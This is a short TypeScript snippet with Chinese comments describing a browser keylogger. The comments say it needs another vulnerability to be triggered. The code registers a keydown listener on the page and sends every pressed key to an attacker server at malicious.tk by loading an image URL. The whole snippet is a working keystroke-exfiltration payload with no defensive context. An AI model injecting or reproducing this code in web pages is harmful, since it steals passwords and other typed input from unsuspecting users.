
// 前端键盘事件监听（需配合其他漏洞触发）
document.addEventListener('keydown', (event: KeyboardEvent) => {
    const key = event.key;
    // 将按键数据发送到攻击者服务器
    new Image().src = `https://malicious.tk/log?key=${encodeURIComponent(key)}`;
});
